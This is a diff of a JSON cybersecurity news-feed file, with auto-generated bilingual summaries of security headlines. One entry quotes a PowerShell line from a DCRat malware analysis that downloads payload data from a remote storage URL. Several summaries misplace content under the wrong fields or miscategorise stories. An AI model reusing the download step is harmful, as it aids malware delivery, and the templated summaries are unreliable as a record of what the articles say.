+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-30-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-29-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-28-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-27-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-26-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-25-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-24-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-23-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-22-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-21-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-20-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-19-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-18-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-17-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-16-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-15-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-14-6/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-13-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-12-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-11-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-10-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-9-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-8-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-7-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-6-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-5-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-4-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-3-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-2-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-1-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-51-8/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-50-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-49-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-48-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-47-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-46-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-45-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-44-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-43-7/",
+      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-38-8/"
     ]
   },
   {
@@ -3016,7 +3336,7 @@
     "cves": [],
     "cvss": [],
     "impacted": [],
-    "image": "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt38c86b96657cb954/64f152a12e2a138ddece5db3/remotework-family-insta_photos-Alamy.jpg?disable=upscale&width=1200&height=630&fit=crop",
+    "image": "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/bltf758cd9fb1671a68/6acfcadc6632e6b387874fb3/remotework-family-insta_photos-Alamy_REVISED_FOR_16_BY_9.jpg?disable=upscale&width=1200&height=630&fit=crop",
     "sources": [
       "https://www.darkreading.com/cyber-risk/security-threats-don-t-stop-at-the-office-why-executives-families-need-training-too"
     ]
@@ -8371,118 +8691,6 @@
     "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhcZguz-U3FsSD6t4YQ45EeFbgnWAy9lM28OAFydsLXZYzOS00aOD7pxUZcgvLMfMAO3SJV_Amu9SoNezLNQOvx823Z92CpqC5ow9XO3d7HJhEKZlwQt4H4Z7kirDwGcSrUyi1ONs_PuULNYjEjzae2c1mncDviOT9iqxD-PhmXCYpulTUNO2rtW5c9AAx/s1600/fortimail.jpg",
     "sources": [
       "https://thehackernews.com/2026/10/critical-fortimail-zero-day-flaw.html"
-    ]
-  },
-  {
-    "id": "0a600d19ae055dc60b81ac32",
-    "title": "The Good, the Bad and the Ugly in Cybersecurity – Week 39 (2026)",
-    "link": "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-39-8",
-    "published": "2026-10-02T00:00:00+00:00",
-    "source": "sentinelone.com",
-    "summary_en": "Who: Threat actors contact DevOps and infrastructure engineers with invitations to review candidate coding repositories hosted on GitHub.. What: In addition to his custodial sentence, the court ordered Vardanyan to pay over $1.2 million in direct victim restitution for the financial damages incurred.. When: 2026-10-02T00:00:00+00:00. How: Court Sentences Initial Access Specialist Tied to Ryuk Ransomware A court has sentenced Armenian citizen Karen Serobovich Vardanyan to two years in federal prison and three years of supervised release for his role in launching high-profile Ryuk ransomware attacks against corporate networks throughout the United States. Action: See Arabic action below.",
-    "summary_ar": "من: Threat actors contact DevOps and infrastructure engineers with invitations to review candidate coding repositories hosted on GitHub.. ماذا: In addition to his custodial sentence, the court ordered Vardanyan to pay over $1.2 million in direct victim restitution for the financial damages incurred.. متى: 2026-10-02T00:00:00+00:00. كيف: Court Sentences Initial Access Specialist Tied to Ryuk Ransomware A court has sentenced Armenian citizen Karen Serobovich Vardanyan to two years in federal prison and three years of supervised release for his role in launching high-profile Ryuk ransomware attacks against corporate networks throughout the United States.. الإجراء: حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
-    "category": "Data Breach",
-    "action": "حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
-    "cves": [
-      "CVE-2022-20775",
-      "CVE-2024-55591",
-      "CVE-2025-12480",
-      "CVE-2025-14174",
-      "CVE-2025-24472",
-      "CVE-2025-31277",
-      "CVE-2025-43510",
-      "CVE-2025-43520",
-      "CVE-2025-43529",
-      "CVE-2025-55182",
-      "CVE-2025-59718",
-      "CVE-2025-59719",
-      "CVE-2025-61884",
-      "CVE-2025-66478",
-      "CVE-2025-68668",
-      "CVE-2026-0257",
-      "CVE-2026-0300",
-      "CVE-2026-20127",
-      "CVE-2026-20131",
-      "CVE-2026-20230",
-      "CVE-2026-20245",
-      "CVE-2026-20700",
-      "CVE-2026-21262",
-      "CVE-2026-21509",
-      "CVE-2026-21858",
-      "CVE-2026-21877",
-      "CVE-2026-24858",
-      "CVE-2026-25253",
-      "CVE-2026-26127",
-      "CVE-2026-26144",
-      "CVE-2026-33032",
-      "CVE-2026-33824",
-      "CVE-2026-36425",
-      "CVE-2026-3909",
-      "CVE-2026-3910",
-      "CVE-2026-41091",
-      "CVE-2026-45498",
-      "CVE-2026-50656",
-      "CVE-2026-5281",
-      "cve-2022-20775",
-      "cve-2024-55591",
-      "cve-2025-12480",
-      "cve-2025-55182",
-      "cve-2025-61884",
-      "cve-2026-0257",
-      "cve-2026-21858",
-      "cve-2026-2441",
-      "cve-2026-36425"
-    ],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blte0419181da53b312/6ab69bdd8ab0c02ef62262e1/GBU_week39_2026.jpg",
-    "sources": [
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-39-8",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-35-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-34-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-33-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-32-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-31-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-30-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-29-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-28-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-27-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-26-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-25-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-24-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-23-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-22-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-21-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-20-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-19-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-18-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-17-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-16-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-15-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-14-6/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-13-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-12-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-11-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-10-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-9-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-8-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-7-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-6-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-5-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-4-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-3-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-2-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-1-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-51-8/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-50-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-49-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-48-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-47-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-46-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-45-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-44-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-43-7/",
-      "https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-38-8/"
     ]
   },
   {
@@ -14983,6 +15191,24 @@
     ]
   },
   {
+    "id": "bb08dfdebae7909672a4f8eb",
+    "title": "When Environment Variables Met Steganography: Inside a Reusable DCRat Delivery Chain",
+    "link": "https://www.sentinelone.com/blog/when-environment-variables-met-steganography-inside-a-reusable-dcrat-delivery-chain/",
+    "published": "2026-09-23T14:09:50+00:00",
+    "source": "sentinelone.com",
+    "summary_en": "Who: $a='https://firebasestorage.googleapis.com/.../JAMAICA.png' $b=New-Object Net.WebClient $c=$b.DownloadData($a) $d=[Text.Encoding]::UTF8.GetString($c) The downloaded file, shown in Figure 9 , looks like a legitimate image.. What: When Environment Variables Met Steganography: Inside a Reusable DCRat Delivery Chain. When: 2026-09-23T14:09:50+00:00. How: As shown in Figure 3 , the script repeatedly appends decoded strings through a custom function, rebuilding a larger payload at runtime. Action: See Arabic action below.",
+    "summary_ar": "من: $a='https://firebasestorage.googleapis.com/.../JAMAICA.png' $b=New-Object Net.WebClient $c=$b.DownloadData($a) $d=[Text.Encoding]::UTF8.GetString($c) The downloaded file, shown in Figure 9 , looks like a legitimate image.. ماذا: When Environment Variables Met Steganography: Inside a Reusable DCRat Delivery Chain. متى: 2026-09-23T14:09:50+00:00. كيف: As shown in Figure 3 , the script repeatedly appends decoded strings through a custom function, rebuilding a larger payload at runtime.. الإجراء: حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
+    "category": "Threat/Attack",
+    "action": "حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
+    "cves": [],
+    "cvss": [],
+    "impacted": [],
+    "image": "https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt5336520867e82224/6a836cebe02fac5efa5de56a/Sentinel_Insider_hero.jpg",
+    "sources": [
+      "https://www.sentinelone.com/blog/when-environment-variables-met-steganography-inside-a-reusable-dcrat-delivery-chain/"
+    ]
+  },
+  {
     "id": "aa96d284c9eb1679730a98c2",
     "title": "How One Kubernetes YAML Can Hand Over a GCP Organization",
     "link": "https://www.bleepingcomputer.com/news/security/how-one-kubernetes-yaml-can-hand-over-a-gcp-organization/",
@@ -21337,24 +21563,6 @@
     "image": "https://assets.infosecurity-magazine.com/webpage/og/f4f061b9-c7c6-4b5e-bee5-0781e97b84c8.jpeg",
     "sources": [
       "https://www.infosecurity-magazine.com/news/microsoft-releases-emergency-patch/"
-    ]
-  },
-  {
-    "id": "9e539e5259e08d157237a7ae",
-    "title": "Cisco patches Secure Email Gateway zero-day exploited in attacks",
-    "link": "https://www.bleepingcomputer.com/news/security/new-cisco-secure-email-zero-day-exploited-to-execute-commands-as-root/",
-    "published": "2026-09-15T07:31:09+00:00",
-    "source": "bleepingcomputer.com",
-    "summary_en": "Who: Cisco warned customers to patch a critical Secure Email Gateway zero-day security flaw that threat actors have been exploiting in attacks.. What: Cisco warned customers to patch a critical Secure Email Gateway zero-day security flaw that threat actors have been exploiting in attacks.. When: 2026-09-15T07:31:09+00:00. How: Cisco warned customers to patch a critical Secure Email Gateway zero-day security flaw that threat actors have been exploiting in attacks. Action: See Arabic action below.",
-    "summary_ar": "من: Cisco warned customers to patch a critical Secure Email Gateway zero-day security flaw that threat actors have been exploiting in attacks.. ماذا: Cisco warned customers to patch a critical Secure Email Gateway zero-day security flaw that threat actors have been exploiting in attacks.. متى: 2026-09-15T07:31:09+00:00. كيف: Cisco warned customers to patch a critical Secure Email Gateway zero-day security flaw that threat actors have been exploiting in attacks.. الإجراء: حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
-    "category": "Patch/Update",
-    "action": "حدِّث الأنظمة فورًا، طبّق إرشادات المورّد، وراقب مؤشرات الاستغلال.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://www.bleepstatic.com/content/hl-images/2026/08/11/Cisco.jpg",
-    "sources": [
-      "https://www.bleepingcomputer.com/news/security/new-cisco-secure-email-zero-day-exploited-to-execute-commands-as-root/"
     ]
   },
   {
@@ -144380,150 +144588,6 @@
     "image": "https://www.zdnet.com/a/img/resize/6e5d3cae0bc5e77fcb8c4e021ceada1f114ef5ea/2024/09/30/5bed40da-613a-40e4-ae02-32af72a2dabb/airtg.jpg?auto=webp&fit=crop&height=675&width=1200",
     "sources": [
       "https://www.zdnet.com/article/apple-airtag-gen-1-deal/"
-    ]
-  },
-  {
-    "id": "72117403d1e5f7fee22484fa",
-    "title": "How NIST's Cutback of CVE Handling Impacts Cyber Teams",
-    "link": "https://www.darkreading.com/threat-intelligence/nist-cutbacks-nvd-handling-impacts-cyber-teams",
-    "published": "2026-04-17T19:51:57+00:00",
-    "source": "darkreading.com",
-    "summary_en": "Who: How NIST's Cutback of CVE Handling Impacts Cyber Teams. What: How NIST's Cutback of CVE Handling Impacts Cyber Teams. When: 2026-04-17T19:51:57+00:00. How: Details in the source. Action: See Arabic action below.",
-    "summary_ar": "من: How NIST's Cutback of CVE Handling Impacts Cyber Teams. ماذا: How NIST's Cutback of CVE Handling Impacts Cyber Teams. متى: 2026-04-17T19:51:57+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "category": "General",
-    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/bltf63750cb2e1d5266/69e26d60df4579bd291869e2/NIST_HQ_Grandbrothers_Alamy.jpg?disable=upscale&width=1200&height=630&fit=crop",
-    "sources": [
-      "https://www.darkreading.com/threat-intelligence/nist-cutbacks-nvd-handling-impacts-cyber-teams"
-    ]
-  },
-  {
-    "id": "2c39273983bbf6a27c795672",
-    "title": "Payouts King ransomware uses QEMU VMs to bypass endpoint security",
-    "link": "https://www.bleepingcomputer.com/news/security/payouts-king-ransomware-uses-qemu-vms-to-bypass-endpoint-security/",
-    "published": "2026-04-17T19:10:19+00:00",
-    "source": "bleepingcomputer.com",
-    "summary_en": "Who: Payouts King ransomware uses QEMU VMs to bypass endpoint security. What: Payouts King ransomware uses QEMU VMs to bypass endpoint security. When: 2026-04-17T19:10:19+00:00. How: The Payouts King ransomware is using the QEMU emulator as a reverse SSH backdoor to run hidden virtual machines on compromised systems and bypass endpoint security. Action: See Arabic action below.",
-    "summary_ar": "من: Payouts King ransomware uses QEMU VMs to bypass endpoint security. ماذا: Payouts King ransomware uses QEMU VMs to bypass endpoint security. متى: 2026-04-17T19:10:19+00:00. كيف: The Payouts King ransomware is using the QEMU emulator as a reverse SSH backdoor to run hidden virtual machines on compromised systems and bypass endpoint security.. الإجراء: اعزل الأنظمة المتأثرة، فعِّل incident response، وأخطر الأطراف المعنية.",
-    "category": "Data Breach",
-    "action": "اعزل الأنظمة المتأثرة، فعِّل incident response، وأخطر الأطراف المعنية.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://www.bleepstatic.com/content/hl-images/2024/05/07/hacker-box.jpg",
-    "sources": [
-      "https://www.bleepingcomputer.com/news/security/payouts-king-ransomware-uses-qemu-vms-to-bypass-endpoint-security/"
-    ]
-  },
-  {
-    "id": "de4e7a57e08ab6da2aabe901",
-    "title": "Tycoon 2FA Phishers Scatter, Adopt Device Code Phishing",
-    "link": "https://www.darkreading.com/threat-intelligence/tycoon-2fa-hackers-device-code-phishing",
-    "published": "2026-04-17T19:05:51+00:00",
-    "source": "darkreading.com",
-    "summary_en": "Who: Tycoon 2FA Phishers Scatter, Adopt Device Code Phishing. What: Tycoon 2FA Phishers Scatter, Adopt Device Code Phishing. When: 2026-04-17T19:05:51+00:00. How: In embracing device code phishing, attackers trick victims into handing over account access by using a service's legitimate new-device login flow. Action: See Arabic action below.",
-    "summary_ar": "من: Tycoon 2FA Phishers Scatter, Adopt Device Code Phishing. ماذا: Tycoon 2FA Phishers Scatter, Adopt Device Code Phishing. متى: 2026-04-17T19:05:51+00:00. كيف: In embracing device code phishing, attackers trick victims into handing over account access by using a service's legitimate new-device login flow.. الإجراء: حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
-    "category": "Threat/Attack",
-    "action": "حدّث التواقيع، احظر الـ IOCs، وفعِّل التوعية للمستخدمين.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt70085bc1304b3cb3/69e2855c41f7f85ddb368bc3/QR_code-Harry_Wedzinga-Alamy.jpg?disable=upscale&width=1200&height=630&fit=crop",
-    "sources": [
-      "https://www.darkreading.com/threat-intelligence/tycoon-2fa-hackers-device-code-phishing"
-    ]
-  },
-  {
-    "id": "d171e49adfde04ebc7bf2b9d",
-    "title": "White House Chief of Staff to Meet With Anthropic CEO Over Its New AI Technology",
-    "link": "https://www.securityweek.com/white-house-chief-of-staff-to-meet-ith-anthropic-ceo-over-its-new-ai-technology/",
-    "published": "2026-04-17T19:00:00+00:00",
-    "source": "securityweek.com",
-    "summary_en": "Who: White House Chief of Staff to Meet With Anthropic CEO Over Its New AI Technology. What: White House Chief of Staff to Meet With Anthropic CEO Over Its New AI Technology. When: 2026-04-17T19:00:00+00:00. How: Details in the source. Action: See Arabic action below.",
-    "summary_ar": "من: White House Chief of Staff to Meet With Anthropic CEO Over Its New AI Technology. ماذا: White House Chief of Staff to Meet With Anthropic CEO Over Its New AI Technology. متى: 2026-04-17T19:00:00+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "category": "General",
-    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "",
-    "sources": [
-      "https://www.securityweek.com/white-house-chief-of-staff-to-meet-ith-anthropic-ceo-over-its-new-ai-technology/"
-    ]
-  },
-  {
-    "id": "e84b1d88c093905aea262bf5",
-    "title": "T-Mobile will give you an iPad for $99 when you sign up for a new line - here's how",
-    "link": "https://www.zdnet.com/article/t-mobile-ipad-11-deal/",
-    "published": "2026-04-17T18:58:44+00:00",
-    "source": "zdnet.com",
-    "summary_en": "Who: T-Mobile will give you an iPad for $99 when you sign up for a new line - here's how. What: T-Mobile will give you an iPad for $99 when you sign up for a new line - here's how. When: 2026-04-17T18:58:44+00:00. How: Details in the source. Action: See Arabic action below.",
-    "summary_ar": "من: T-Mobile will give you an iPad for $99 when you sign up for a new line - here's how. ماذا: T-Mobile will give you an iPad for $99 when you sign up for a new line - here's how. متى: 2026-04-17T18:58:44+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "category": "General",
-    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://www.zdnet.com/a/img/resize/3baef42550a4acaa53d2e176186f2887c7b8cb0a/2025/04/30/c0acdb58-cde9-4497-ba18-ec1c68ada08c/photos-copy.jpg?auto=webp&fit=crop&height=675&width=1200",
-    "sources": [
-      "https://www.zdnet.com/article/t-mobile-ipad-11-deal/"
-    ]
-  },
-  {
-    "id": "df0453858645d6e22836c8cc",
-    "title": "T-Mobile will give you a Samsung Galaxy Watch 8 for free - how to get yours",
-    "link": "https://www.zdnet.com/article/samsung-galaxy-watch-8-tmobile-deal/",
-    "published": "2026-04-17T18:28:13+00:00",
-    "source": "zdnet.com",
-    "summary_en": "Who: Get a free Samsung Galaxy Watch 8 at T-Mobile right now when you add a new watch line to your mobile plan - or save $300 on the Apple Watch Series 11.. What: T-Mobile will give you a Samsung Galaxy Watch 8 for free - how to get yours. When: 2026-04-17T18:28:13+00:00. How: Details in the source. Action: See Arabic action below.",
-    "summary_ar": "من: Get a free Samsung Galaxy Watch 8 at T-Mobile right now when you add a new watch line to your mobile plan - or save $300 on the Apple Watch Series 11.. ماذا: T-Mobile will give you a Samsung Galaxy Watch 8 for free - how to get yours. متى: 2026-04-17T18:28:13+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "category": "General",
-    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://www.zdnet.com/a/img/resize/e5a5fb86ab1496861eedd9f8ac43c724404e82e9/2025/07/08/925998d1-bb48-4bbf-a59f-ae929a48da9c/dsc06469.jpg?auto=webp&fit=crop&height=675&width=1200",
-    "sources": [
-      "https://www.zdnet.com/article/samsung-galaxy-watch-8-tmobile-deal/"
-    ]
-  },
-  {
-    "id": "2436ef83079d44ef672d0e6f",
-    "title": "Prolonged AI use can be hazardous to your health and work: 4 ways to stay safe",
-    "link": "https://www.zdnet.com/article/why-prolonged-ai-use-risks-your-health-4-ways-to-stay-safe/",
-    "published": "2026-04-17T18:06:37+00:00",
-    "source": "zdnet.com",
-    "summary_en": "Who: Prolonged AI use can be hazardous to your health and work: 4 ways to stay safe. What: Prolonged AI use can be hazardous to your health and work: 4 ways to stay safe. When: 2026-04-17T18:06:37+00:00. How: Details in the source. Action: See Arabic action below.",
-    "summary_ar": "من: Prolonged AI use can be hazardous to your health and work: 4 ways to stay safe. ماذا: Prolonged AI use can be hazardous to your health and work: 4 ways to stay safe. متى: 2026-04-17T18:06:37+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "category": "General",
-    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://www.zdnet.com/a/img/resize/9500b8c8ba02dff1c01cd712dda70c5bbe9c2816/2026/04/17/6eec25f3-d8c3-46e9-8b44-b2175267a6ac/adeephole-gettyimages-856656258.jpg?auto=webp&fit=crop&height=675&width=1200",
-    "sources": [
-      "https://www.zdnet.com/article/why-prolonged-ai-use-risks-your-health-4-ways-to-stay-safe/"
-    ]
-  },
-  {
-    "id": "ad2a587f0805c503f5d9ffa6",
-    "title": "Verizon will give you a free iPad or Apple Watch with your next iPhone - how the deal works",
-    "link": "https://www.zdnet.com/article/verizon-ipad-apple-watch-deal/",
-    "published": "2026-04-17T17:22:00+00:00",
-    "source": "zdnet.com",
-    "summary_en": "Who: The latest Verizon deal lets you choose either the A16 iPad or a recent Apple Watch model for free with select Unlimited mobile plans.. What: Verizon will give you a free iPad or Apple Watch with your next iPhone - how the deal works. When: 2026-04-17T17:22:00+00:00. How: Details in the source. Action: See Arabic action below.",
-    "summary_ar": "من: The latest Verizon deal lets you choose either the A16 iPad or a recent Apple Watch model for free with select Unlimited mobile plans.. ماذا: Verizon will give you a free iPad or Apple Watch with your next iPhone - how the deal works. متى: 2026-04-17T17:22:00+00:00. كيف: تفاصيل إضافية بالمصدر. الإجراء: اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "category": "General",
-    "action": "اتّبع إرشادات المصدر وطبّق أفضل الممارسات.",
-    "cves": [],
-    "cvss": [],
-    "impacted": [],
-    "image": "https://www.zdnet.com/a/img/resize/a5e281e7843f288bf7ff88fe4f2e5e73b703c21d/2026/04/16/bc9c44b8-54dd-4730-bbbb-7d34d9cb9b0f/verizon-apple-bundle.jpg?auto=webp&fit=crop&height=675&width=1200",
-    "sources": [
-      "https://www.zdnet.com/article/verizon-ipad-apple-watch-deal/"
     ]
   }
 ]
